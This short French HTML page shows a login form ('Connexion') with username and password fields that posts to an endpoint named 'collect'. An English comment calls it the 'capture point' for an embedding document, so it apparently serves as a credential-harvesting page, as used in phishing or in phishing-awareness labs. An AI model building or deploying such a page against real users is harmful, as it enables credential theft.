<!doctype html>
<html lang="fr">
<head><meta charset="utf-8"><title>Connexion</title></head>
<body>
<!-- The capture point lives here, not in the embedding document. -->
<form method="post" action="collect">
  <label>Identifiant <input type="text" name="user" autocomplete="username"></label>
  <label>Mot de passe <input type="password" name="pass" autocomplete="current-password"></label>
  <button type="submit">Se connecter</button>
</form>
</body>
</html>
